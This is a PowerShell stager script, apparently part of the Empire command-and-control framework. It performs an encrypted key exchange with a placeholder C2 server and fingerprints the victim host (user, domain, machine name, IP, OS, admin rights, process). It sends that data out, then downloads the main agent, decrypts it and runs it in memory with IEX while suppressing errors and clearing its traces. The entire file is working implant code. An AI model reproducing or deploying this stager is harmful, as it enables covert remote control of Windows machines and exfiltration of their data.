function Start-Negotiate{
    # param($s,$SK,$UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
    param($s,$SK,$UA="lol")
    
    # make sure the appropriate assemblies are loaded
    Add-Type -assembly System.Security;
    Add-Type -assembly System.Core;

    # try to ignore all errors
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;

    # set up the AES encryption object
    # $SK -> staging key for this server
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    # export the public key in the only format possible...stupid
    $rk=$rs.ToXmlString($False);
    $r=1..16|ForEach-Object{Get-Random -max 26};

    # generate a randomized sessionID of 16 characters
    $ID=('ABCDEFGHKLMNPRSTUVWXYZ123456789'[$r] -join '');

    # build the packet of (sessionID|xml_key)
    $ib=$e.getbytes($rk);

    # encrypt the packet for the c2 server
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);

    # if the web client doesn't exist, create a new web client and set appropriate options
    #   this only happens if this stager.ps1 code is NOT called from a launcher context
    if(-not $wc){
        $wc=new-object system.net.WebClient;
        # set the proxy settings for the WC to be the default system settings
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }
    # the User-Agent always resets for multiple calls...silly
    $wc.Headers.Add("User-Agent",$UA);

    # add in the session ID cookie
    $wc.Headers.Add("Cookie","SESSIONID=$ID");

    # actually post the data to the C2 server
    $raw=$wc.UploadData($s+"index.jsp","POST",$eb);

    # get the response from the server
    $de=$e.GetString($rs.decrypt($raw,$false));

    # packet = server epoch time + AES session key
    $epoch=$de[0..9] -join'';
    $key=$de[10..$de.length] -join '';

    # create a new AES object
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;

    # get some basic system information
    $i=$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    # check if the IP is a string or the [IPv4,IPv6] array
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    # detect if we're SYSTEM or otherwise high-integrity
    if(([Environment]::UserName).ToLower() -eq "system"){$i+='|True'}
    else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    # get the current process name and ID
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    # get the powershell.exe version
    $i += '|' + $PSVersionTable.PSVersion.Major;

    # send back the initial system information
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);

    # the User-Agent always resets for multiple calls...silly
    $wc.Headers.Add("User-Agent",$UA);

    # post the data back to the C2 server
    $raw=$wc.UploadData($s+"index.php","POST",$eb2);

    # decode the second response from the server, i.e. the main agent.ps1
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $AES.Mode="CBC";
    $IV = $raw[0..15];$AES.Key=$e.GetBytes($key);$AES.IV = $IV;

    # decrypt the agent and register the agent logic
    IEX $([System.Text.Encoding]::ASCII.GetString( $($AES.CreateDecryptor().TransformFinalBlock($raw[16..$raw.Length],0,$raw.Length-16))));

    # clear some variables out of memory and cleanup before execution
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    # TODO: remove this shitty $server logic
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;
} Start-Negotiate -s "REPLACE_SERVER" -SK 'REPLACE_STAGING_KEY' -UA $u;
